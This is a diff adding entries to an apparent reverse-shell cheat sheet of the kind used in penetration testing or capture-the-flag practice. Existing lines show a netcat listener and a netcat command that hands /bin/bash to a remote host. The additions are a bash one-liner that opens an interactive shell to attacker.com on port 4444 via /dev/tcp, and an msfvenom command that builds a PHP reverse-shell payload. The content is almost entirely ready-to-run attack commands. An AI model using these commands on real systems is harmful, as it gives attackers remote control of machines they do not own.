@@ -4,6 +4,10 @@ sudo nc -lvnp 443
 # target:  
 nc local-ip port -e /bin/bash
 ```
+## bash reverse shell
+```bash
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+```
 ### php reverse shell
 ```bash
 php reverse shell:  
@@ -18,6 +22,12 @@ stty raw -echo;fg
 stty rows 29 columns 126  
 export TERM=XTERM-256color
 ```
+## generating reverse shell with msfvenom
+```bash
+msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+```
+
+
 ## Other tools
 
 [https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)
